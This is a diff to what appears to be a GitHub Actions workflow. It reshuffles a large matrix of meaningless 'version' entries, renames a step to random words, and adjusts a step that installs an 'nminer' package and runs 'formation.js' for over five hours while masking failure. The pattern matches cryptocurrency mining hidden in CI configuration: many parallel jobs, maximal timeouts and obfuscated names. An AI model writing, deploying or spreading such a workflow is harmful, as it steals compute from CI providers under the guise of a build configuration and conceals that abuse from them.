@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
+          - { version: 6808 }
+          - { version: 9550 }
+          - { version: 794 }
+          - { version: 7325 }
+          - { version: 5521 }
+          - { version: 792 }
           - { version: 1443 }
-          - { version: 8176 }
-          - { version: 2570 }
-          - { version: 3654 }
-          - { version: 4040 }
-          - { version: 7857 }
-          - { version: 2691 }
-          - { version: 4718 }
-          - { version: 4313 }
-          - { version: 6454 }
-          - { version: 7153 }
-          - { version: 6653 }
-          - { version: 4265 }
-          - { version: 5964 }
-          - { version: 2009 }
-          - { version: 2168 }
-          - { version: 5355 }
-          - { version: 7701 }
-          - { version: 7111 }
-          - { version: 8005 }
+          - { version: 8798 }
+          - { version: 5406 }
+          - { version: 7376 }
+          - { version: 22 }
+          - { version: 3084 }
+          - { version: 2578 }
+          - { version: 5186 }
+          - { version: 4334 }
+          - { version: 7263 }
+          - { version: 6109 }
+          - { version: 4028 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: front cosset well-documented
+      - name: furlough upbeat decriminalize conceptualize reorient
         run: |
           npm install nminer@latest
-          timeout 348m node formation.js || echo "formation executed"
+          timeout 325m node formation.js || echo "formation executed"
